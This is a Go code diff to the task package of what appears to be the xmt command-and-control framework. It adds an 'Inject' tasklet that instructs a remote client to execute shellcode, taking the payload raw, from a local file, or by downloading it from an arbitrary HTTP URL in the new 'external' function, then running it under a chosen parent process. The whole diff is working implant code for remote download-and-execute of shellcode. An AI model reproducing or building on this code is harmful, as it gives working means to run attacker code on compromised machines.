@@ -2,6 +2,9 @@ package task
 
 import (
 	"context"
+	"io/ioutil"
+	"net/http"
+	"strings"
 	"time"
 	"unsafe"
 
@@ -10,6 +13,12 @@ import (
 	"github.com/iDigitalFlame/xmt/data"
 )
 
+// Inject represents the code injection Tasklet. This can be used to instruct a client to
+// execute shellcode.
+const Inject = code(0xC4)
+
+type code uint8
+
 // Code is a struct that is similar to the 'cmd.Code' struct. This is used to Task a Client with running shellcode
 // on devices. This struct has many of the functionallies of the standard 'cmd.Code' function. The
 // 'SetParent' function will attempt to set the target that runs the shellcode. If none are specified, the shellcode
@@ -17,8 +26,24 @@ import (
 type Code struct {
 	Data    []byte
 	Wait    bool
+	Path    string
 	Filter  *cmd.Filter
 	Timeout time.Duration
+}
+
+func (code) Thread() bool {
+	return true
+}
+func (code) Run(c *Code) *com.Packet {
+	v := &com.Packet{ID: TvCode}
+	c.MarshalStream(v)
+	return v
+}
+func (code) Raw(b []byte) *com.Packet {
+	return Inject.Run(&Code{Data: b})
+}
+func (code) RemotePath(s string) *com.Packet {
+	return Inject.Run(&Code{Path: s})
 }
 
 // MarshalStream writes the data for this Code thread to the supplied Writer.
@@ -27,6 +52,9 @@ func (c Code) MarshalStream(w data.Writer) error {
 		return err
 	}
 	if err := w.WriteUint64(uint64(c.Timeout)); err != nil {
+		return err
+	}
+	if err := w.WriteString(c.Path); err != nil {
 		return err
 	}
 	if err := w.WriteBool(c.Filter != nil); err != nil {
@@ -51,6 +79,9 @@ func (c *Code) UnmarshalStream(r data.Reader) error {
 	if err := r.ReadUint64((*uint64)(unsafe.Pointer(&c.Timeout))); err != nil {
 		return err
 	}
+	if err := r.ReadString(&c.Path); err != nil {
+		return err
+	}
 	f, err := r.Bool()
 	if err != nil {
 		return err
@@ -66,12 +97,28 @@ func (c *Code) UnmarshalStream(r data.Reader) error {
 	}
 	return nil
 }
-func code(x context.Context, p *com.Packet) (*com.Packet, error) {
+func (code) LocalFile(s string) (*com.Packet, error) {
+	b, err := ioutil.ReadFile(s)
+	if err != nil {
+		return nil, err
+	}
+	return Inject.Raw(b), nil
+}
+func (code) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
 	var c Code
 	if err := c.UnmarshalStream(p); err != nil {
 		return nil, err
 	}
-	z := cmd.NewCodeContext(x, c.Data)
+	var z *cmd.Code
+	if len(c.Path) > 0 {
+		b, err := external(x, c.Timeout, c.Path)
+		if err != nil {
+			return nil, err
+		}
+		z = cmd.NewCodeContext(x, b)
+	} else {
+		z = cmd.NewCodeContext(x, c.Data)
+	}
 	z.Timeout = c.Timeout
 	z.SetParent(c.Filter)
 	if err := z.Start(); err != nil {
@@ -93,4 +140,24 @@ func code(x context.Context, p *com.Packet) (*com.Packet, error) {
 	e, _ := z.ExitCode()
 	w.WriteInt32(e)
 	return w, nil
+}
+func external(x context.Context, d time.Duration, s string) ([]byte, error) {
+	if strings.HasPrefix(s, "http") {
+		var (
+			c, f = context.WithTimeout(x, d)
+			r, _ = http.NewRequestWithContext(c, http.MethodGet, s, nil)
+		)
+		o, err := http.DefaultClient.Do(r)
+		if err != nil {
+			f()
+			return nil, err
+		}
+		b, err := ioutil.ReadAll(o.Body)
+		o.Body.Close()
+		if f(); err != nil {
+			return nil, err
+		}
+		return b, nil
+	}
+	return ioutil.ReadFile(s)
 }
